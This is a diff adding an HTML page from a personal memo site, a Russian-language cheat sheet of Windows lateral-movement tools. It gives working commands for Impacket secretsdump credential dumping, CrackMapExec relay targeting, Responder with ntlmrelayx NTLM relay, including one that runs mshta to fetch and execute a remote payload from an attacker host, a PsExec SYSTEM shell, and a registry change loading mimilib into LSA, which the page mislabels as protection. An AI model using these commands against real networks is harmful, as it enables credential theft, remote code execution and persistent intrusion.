@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  
+  
+  <link rel="shortcut icon" href="../img/favicon.ico">
+  <title>Утилиты для продвижения - Personal memo. spinetru</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700" />
+
+  <link rel="stylesheet" href="../css/theme.css" />
+  <link rel="stylesheet" href="../css/theme_extra.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css" />
+  
+  <script>
+    // Current page data
+    var mkdocs_page_name = "\u0423\u0442\u0438\u043b\u0438\u0442\u044b \u0434\u043b\u044f \u043f\u0440\u043e\u0434\u0432\u0438\u0436\u0435\u043d\u0438\u044f";
+    var mkdocs_page_input_path = "hack_utilities.md";
+    var mkdocs_page_url = null;
+  </script>
+  
+  <script src="../js/jquery-2.1.1.min.js" defer></script>
+  <script src="../js/modernizr-2.8.3.min.js" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script> 
+  
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+        <a href=".." class="icon icon-home"> Personal memo. spinetru</a>
+        <div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="..">My personal tips</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../elastic/">Elastic</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../hack_framework/">Framework hack</a>
+                    </li>
+                </ul>
+                <ul class="current">
+                    <li class="toctree-l1 current"><a class="reference internal current" href="./">Утилиты для продвижения</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#impacket">Impacket</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#secretsdump">Secretsdump</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#crackmapexec-cme-powered-by-impacket">CrackMapExec (CME). Powered by Impacket</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#responder">Responder</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#psexec">Psexec</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#mimikaz">mimikaz</a>
+    </li>
+    </ul>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../response_ib/">Обнаружение инцидента</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../tmux/">Tmux</a>
+                    </li>
+                </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+        <a href="..">Personal memo. spinetru</a>
+      </nav>
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="..">Docs</a> &raquo;</li>
+    
+      
+    
+    <li>Утилиты для продвижения</li>
+    <li class="wy-breadcrumbs-aside">
+      
+    </li>
+  </ul>
+  
+  <hr/>
+</div>
+          <div role="main">
+            <div class="section">
+              
+                <h1 id="_1">Утилиты для продвижения</h1>
+<h2 id="impacket">Impacket</h2>
+<div class="codehilite"><pre><span></span><code><span class="err">impacket-addcomputer        impacket-goldenPac          impacket-psexec             impacket-smbserver</span>
+<span class="err">impacket-atexec             impacket-karmaSMB           impacket-raiseChild         impacket-sniff</span>
+<span class="err">impacket-dcomexec           impacket-kintercept         impacket-rdp_check          impacket-sniffer</span>
+<span class="err">impacket-dpapi              impacket-lookupsid          impacket-reg                impacket-split</span>
+<span class="err">impacket-esentutl           impacket-mimikatz           impacket-registry-read      impacket-ticketConverter</span>
+<span class="err">impacket-exchanger          impacket-mqtt_check         impacket-rpcdump            impacket-ticketer</span>
+<span class="err">impacket-findDelegation     impacket-mssqlclient        impacket-rpcmap             impacket-wmiexec</span>
+<span class="err">impacket-GetADUsers         impacket-mssqlinstance      impacket-sambaPipe          impacket-wmipersist</span>
+<span class="err">impacket-getArch            impacket-netview            impacket-samrdump           impacket-wmiquery</span>
+<span class="err">impacket-GetNPUsers         impacket-nmapAnswerMachine  impacket-secretsdump</span>
+<span class="err">impacket-getPac             impacket-ntfs-read          impacket-services</span>
+<span class="err">impacket-getST              impacket-ntlmrelayx         impacket-smbclient</span>
+<span class="err">impacket-getTGT             impacket-ping               impacket-smbexec            </span>
+<span class="err">impacket-GetUserSPNs        impacket-ping6              impacket-smbrelayx          </span>
+</code></pre></div>
+
+<p>Разведка AD</p>
+<p>Сбор данных с MSSQL</p>
+<p>Получение учетных данных SMB Relay</p>
+<p>Получение с КД файла ntds.dit</p>
+<p>Удаленно выполняет команды:
+1. atexec
+2. dcomexec
+3. wmiexec
+4. smbexec (Создает службу BTOBTO)</p>
+<h3 id="secretsdump">Secretsdump</h3>
+<p>Получение  копии областей памяти LSA SAM SECURITY NTDS.dit
+На вход нужен пароль или хеш
+Выполняет открытие SCM(Service Control Manager) и доступ к реестру winreg
+<code>secretsdump -debug -system SYSTEM -sam SAM -ntds NTDS -security SECURITY -bootkey BOOTKEY -outputfile 1.txt -use-vss -exec-method mmcexec -user-status -dc-ip 10.10.10.1 -target-ip 10.10.10.1 user:pass</code></p>
+<h2 id="crackmapexec-cme-powered-by-impacket">CrackMapExec (CME). Powered by Impacket</h2>
+<p>Содержит модули bloodhound, mimikatz, внедрение Empire_agent, meterpreter</p>
+<p>Создать список хостов, которые поддерживают атаку ntlmrelay
+<code>cme smb &lt;CIDR&gt; --gen-relay-list targets.txt</code></p>
+<h2 id="responder">Responder</h2>
+<p>для атаки релея необходимо отключить  Responder.conf file and turn off the SMB and HTTP servers:
+<code>SMB = Off</code>
+<code>HTTP = Off</code></p>
+<p>запуск в одном терминале:
+<code>Responder.py -I &lt;interface&gt; -r -d -w</code>
+в другом:
+<code>ntlmrelayx.py -tf targets.txt</code>
+а лучше:
+<code>ntlmrelayx.py -tf targets.txt -c &lt;any code launcher, kodiac ex&gt;</code>
+или
+<code>ntlmrelayx.py -tf targets.txt -smb2support --enum-local-admins -of 'NTLMv2hsh.txt' -c 'mshta http://myip:4444/kodiak'</code></p>
+<h2 id="psexec">Psexec</h2>
+<p>запуск локально cmd с правами системы:
+<code>PsExec.exe -s -i cmd</code></p>
+<h2 id="mimikaz">mimikaz</h2>
+<p>Защита реестра. Надо добавить:
+<code>reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ /f</code></p>
+              
+            </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="../response_ib/" class="btn btn-neutral float-right" title="Обнаружение инцидента">Next <span class="icon icon-circle-arrow-right"></span></a>
+      
+      
+        <a href="../hack_framework/" class="btn btn-neutral" title="Framework hack"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+    
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+      
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="versions">
+    <span class="rst-current-version" data-toggle="rst-current-version">
+      
+      
+        <span><a href="../hack_framework/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+      
+      
+        <span style="margin-left: 15px"><a href="../response_ib/" style="color: #fcfcfc">Next &raquo;</a></span>
+      
+    </span>
+</div>
+    <script>var base_url = '..';</script>
+    <script src="../js/theme.js" defer></script>
+      <script src="../search/main.js" defer></script>
+    <script defer>
+        window.onload = function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        };
+    </script>
+
+</body>
+</html>
